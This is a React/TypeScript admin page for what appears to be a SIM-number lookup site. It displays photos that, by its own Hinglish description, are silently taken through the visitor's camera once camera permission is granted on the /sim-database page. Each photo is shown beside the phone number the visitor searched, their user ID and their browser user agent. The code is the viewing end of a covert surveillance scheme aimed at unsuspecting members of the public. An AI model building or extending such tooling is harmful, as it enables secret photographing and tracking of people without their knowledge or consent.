import { createFileRoute } from "@tanstack/react-router";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Camera, Trash2, RefreshCw } from "lucide-react";
import { Button } from "@/components/ui/button";
import { toast } from "sonner";

export const Route = createFileRoute("/admin/sim-captures")({ component: AdminSimCaptures });

type Row = {
  id: string;
  user_id: string | null;
  storage_path: string;
  user_agent: string | null;
  page: string | null;
  searched_number: string | null;
  created_at: string;
};

function AdminSimCaptures() {
  const qc = useQueryClient();
  const [urls, setUrls] = useState<Record<string, string>>({});

  const { data, isLoading, refetch } = useQuery({
    queryKey: ["sim-captures"],
    queryFn: async () => {
      const { data, error } = await supabase
        .from("sim_captures")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(200);
      if (error) throw error;
      return (data ?? []) as Row[];
    },
    refetchInterval: 20000,
  });

  useEffect(() => {
    if (!data) return;
    (async () => {
      const map: Record<string, string> = {};
      await Promise.all(
        data.map(async (r) => {
          const { data: signed } = await supabase.storage
            .from("sim-captures")
            .createSignedUrl(r.storage_path, 60 * 60);
          if (signed?.signedUrl) map[r.id] = signed.signedUrl;
        }),
      );
      setUrls(map);
    })();
  }, [data]);

  async function remove(row: Row) {
    if (!confirm("Delete this capture?")) return;
    await supabase.storage.from("sim-captures").remove([row.storage_path]);
    await supabase.from("sim_captures").delete().eq("id", row.id);
    toast.success("Deleted");
    qc.invalidateQueries({ queryKey: ["sim-captures"] });
  }

  return (
    <div className="mx-auto max-w-6xl space-y-6">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="rounded-full bg-red-500/15 p-3 text-red-500">
            <Camera className="h-6 w-6" />
          </div>
          <div>
            <h1 className="text-2xl font-bold">SIM Database Captures</h1>
            <p className="text-sm text-muted-foreground">
              Jab koi user /sim-database kholta hai to browser camera permission maangta hai — allow karne par ek silent photo capture ho jaati hai. {data?.length ?? 0} captures.
            </p>
          </div>
        </div>
        <Button variant="outline" onClick={() => refetch()}>
          <RefreshCw className="mr-2 h-4 w-4" /> Refresh
        </Button>
      </div>

      {isLoading ? (
        <p className="text-sm text-muted-foreground">Loading...</p>
      ) : !data || data.length === 0 ? (
        <div className="rounded-xl border bg-card p-8 text-center text-sm text-muted-foreground">
          Abhi tak koi capture nahi. Jaise hi koi user camera allow karega, yahan photo aajayegi.
        </div>
      ) : (
        <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-3">
          {data.map((r) => (
            <div key={r.id} className="overflow-hidden rounded-xl border bg-card">
              {urls[r.id] ? (
                <img src={urls[r.id]} alt="capture" className="h-56 w-full object-cover" />
              ) : (
                <div className="flex h-56 w-full items-center justify-center bg-muted text-xs text-muted-foreground">
                  Loading image…
                </div>
              )}
              <div className="p-3 space-y-1 text-xs">
                <div className="font-semibold text-sm">
                  {r.searched_number ? `📞 ${r.searched_number}` : "— page open —"}
                </div>
                <div className="text-muted-foreground">
                  {new Date(r.created_at).toLocaleString()}
                </div>
                <div className="text-muted-foreground truncate">
                  {r.user_id ? `User: ${r.user_id.slice(0, 8)}…` : "Guest"}
                </div>
                <div className="text-muted-foreground truncate" title={r.user_agent ?? ""}>
                  {r.user_agent}
                </div>
                <Button
                  variant="destructive"
                  size="sm"
                  className="w-full mt-2"
                  onClick={() => remove(r)}
                >
                  <Trash2 className="mr-2 h-3.5 w-3.5" /> Delete
                </Button>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}
